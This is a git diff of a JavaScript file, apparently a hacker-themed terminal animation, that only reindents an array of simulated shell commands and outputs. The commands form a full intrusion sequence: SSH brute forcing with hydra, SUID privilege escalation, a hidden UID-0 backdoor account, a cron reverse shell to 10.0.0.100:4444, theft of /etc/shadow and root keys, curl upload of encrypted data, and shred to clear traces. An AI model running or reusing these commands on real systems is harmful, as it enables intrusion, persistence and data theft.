@@ -216,7 +216,7 @@ function showWhiteRabbit() {
   
   Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
     `,
-    'www-data@webserver:/var/www/html$ gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
+  'www-data@webserver:/var/www/html$ gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
     `
   ===============================================================
   Gobuster v3.1.0
@@ -228,24 +228,24 @@ function showWhiteRabbit() {
   /private (Status: 403)
   ===============================================================
     `,
-    'www-data@webserver:/var/www/html$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
+  'www-data@webserver:/var/www/html$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
     `
   Hydra v9.3-dev (c) 2024 by van Hauser/THC & David Maciejak
   [DATA] attacking ssh://10.0.0.5:22/
   [22][ssh] host: 10.0.0.5   login: admin   password: SecurePass123!
   [STATUS] attack finished for 10.0.0.5 (valid pair found)
     `,
-    'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
+  'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
     `
   Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
   appuser@app-server:/home/appuser$
     `,
-    'appuser@app-server:/home/appuser$ sudo -l',
+  'appuser@app-server:/home/appuser$ sudo -l',
     `
   User appuser may run the following commands on app-server:
       (ALL) NOPASSWD: /usr/bin/vuln_suid
     `,
-    'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
+  'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
     `
   --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   Resolving github.com (github.com)... 140.82.121.4
@@ -258,9 +258,9 @@ function showWhiteRabbit() {
   
   2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]
     `,
-    'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
-    '',
-    'appuser@app-server:/home/appuser$ ./linpeas.sh | tee /tmp/linpeas_output.txt',
+  'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
+  '',
+  'appuser@app-server:/home/appuser$ ./linpeas.sh | tee /tmp/linpeas_output.txt',
     `
   Hostname: app-server
   Kernel: 5.15.0-78-generic x86_64
@@ -269,50 +269,50 @@ function showWhiteRabbit() {
   [+] SUID binaries:
       /usr/bin/vuln_suid
     `,
-    'appuser@app-server:/home/appuser$ /usr/bin/vuln_suid',
+  'appuser@app-server:/home/appuser$ /usr/bin/vuln_suid',
     `
   # id
   uid=0(root) gid=0(root) groups=0(root)
     `,
-    'root@app-server:/root$ useradd -ou 0 -g 0 -M -r -s /bin/bash backupsvc',
-    '',
-    'root@app-server:/root$ echo "backupsvc:RootAccess2024!" | chpasswd',
-    '',
-    'root@app-server:/root$ echo "* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1" | tee -a /etc/crontab',
-    '',
-    'root@app-server:/root$ cat /etc/shadow',
+  'root@app-server:/root$ useradd -ou 0 -g 0 -M -r -s /bin/bash backupsvc',
+  '',
+  'root@app-server:/root$ echo "backupsvc:RootAccess2024!" | chpasswd',
+  '',
+  'root@app-server:/root$ echo "* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1" | tee -a /etc/crontab',
+  '',
+  'root@app-server:/root$ cat /etc/shadow',
     `
   root:$6$h7WE...S6$9B6xx...EncryptedHash:18775:0:99999:7:::
   appuser:$6$FgP3...Y7$3Z8xy...EncryptedHash:18775:0:99999:7:::
     `,
-    'root@app-server:/root$ cat /root/.ssh/id_rsa',
+  'root@app-server:/root$ cat /root/.ssh/id_rsa',
     `
   -----BEGIN RSA PRIVATE KEY-----
   MIIEpQIBAAKCAQEA7G12q0...
   -----END RSA PRIVATE KEY-----
     `,
-    'root@app-server:/root$ scp -i /tmp/root_key /tmp/linpeas_output.txt root@10.0.0.6:/tmp/',
+  'root@app-server:/root$ scp -i /tmp/root_key /tmp/linpeas_output.txt root@10.0.0.6:/tmp/',
     `
   linpeas_output.txt 100% |********************************|   14.5kB   0:00:00
     `,
-    'root@app-server:/root$ ssh -i /tmp/root_key root@10.0.0.6',
+  'root@app-server:/root$ ssh -i /tmp/root_key root@10.0.0.6',
     `
   Welcome to CentOS Stream release 9 (Core)
   dbadmin@db-server:/var/lib/mysql$
     `,
-    'dbadmin@db-server:/var/lib/mysql$ tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
-    '',
-    'dbadmin@db-server:/var/lib/mysql$ openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
-    '',
-    'dbadmin@db-server:/var/lib/mysql$ curl -X POST -F "file=@/tmp/data.enc" http://10.0.0.100/upload',
+  'dbadmin@db-server:/var/lib/mysql$ tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
+  '',
+  'dbadmin@db-server:/var/lib/mysql$ openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
+  '',
+  'dbadmin@db-server:/var/lib/mysql$ curl -X POST -F "file=@/tmp/data.enc" http://10.0.0.100/upload',
     `
   100  130k    0  130k    0     0  2012k      0 --:--:-- --:--:-- --:--:-- 2012k
   Upload complete.
     `,
-    'dbadmin@db-server:/var/lib/mysql$ shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
-    '',
-    'dbadmin@db-server:/var/lib/mysql$ exit',
-    ''
+  'dbadmin@db-server:/var/lib/mysql$ shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
+  '',
+  'dbadmin@db-server:/var/lib/mysql$ exit',
+  ''
   ];      
   
   let currentLogIndex = 0;
